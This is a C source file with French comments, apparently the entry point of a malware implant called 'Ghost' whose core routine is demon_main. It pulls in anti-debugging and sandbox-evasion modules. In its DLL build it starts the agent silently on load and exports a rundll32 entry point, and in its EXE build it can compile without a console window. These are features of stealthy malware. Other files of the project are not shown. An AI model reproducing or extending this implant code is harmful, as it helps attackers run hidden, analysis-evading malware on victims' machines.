/*
 * main.c - Point d'entrée de l'agent Ghost
 *
 * Peut être compilé en EXE ou DLL.
 */

#include "core/demon.h"
#include "evasion/antidebug.h"
#include "evasion/sandbox.h"

#ifdef BUILD_DLL
/*
 * Entry point pour DLL
 */
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
  (void)hinstDLL;
  (void)lpReserved;

  switch (fdwReason) {
  case DLL_PROCESS_ATTACH:
    /* Lance l'agent dans un nouveau thread pour pas bloquer */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)demon_main, NULL, 0, NULL);
    break;

  case DLL_PROCESS_DETACH:
    demon_shutdown();
    break;
  }

  return TRUE;
}

/* Export pour rundll32 */
__declspec(dllexport) void CALLBACK Start(HWND hwnd, HINSTANCE hinst,
                                          LPSTR lpszCmdLine, int nCmdShow) {
  (void)hwnd;
  (void)hinst;
  (void)lpszCmdLine;
  (void)nCmdShow;

  demon_main();
}

#else
/*
 * Entry point pour EXE
 */
int main(int argc, char *argv[]) {
  (void)argc;
  (void)argv;

  return demon_main();
}

/*
 * WinMain pour compilation sans console (-mwindows)
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {
  (void)hInstance;
  (void)hPrevInstance;
  (void)lpCmdLine;
  (void)nCmdShow;

  return demon_main();
}
#endif
